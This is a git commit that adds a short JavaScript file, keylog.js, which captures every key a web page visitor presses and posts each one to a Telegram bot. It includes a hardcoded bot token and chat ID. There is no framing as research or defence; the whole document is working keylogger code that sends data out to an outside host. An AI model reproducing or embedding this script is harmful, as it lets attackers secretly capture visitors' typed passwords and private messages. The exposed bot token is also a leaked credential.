212fc2511bb65ad412e9517bd5e0ffcf5f5a296d
misquee <110459286+misquee@users.noreply.github.com>
2025-01-31 16:14:08 +0800

    Create keylog.js

---
+++ keylog.js
@@ -0,0 +1,12 @@
+document.addEventListener("keydown", function(event) {
+    fetch("https://api.telegram.org/bot6592357228:AAGNYLCsNW2prmow3QvY9ieeHG-stoTJ55I/sendMessage", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            chat_id: "1002002449257",
+            text: "Key Pressed: " + event.key
+        })
+    });
+});
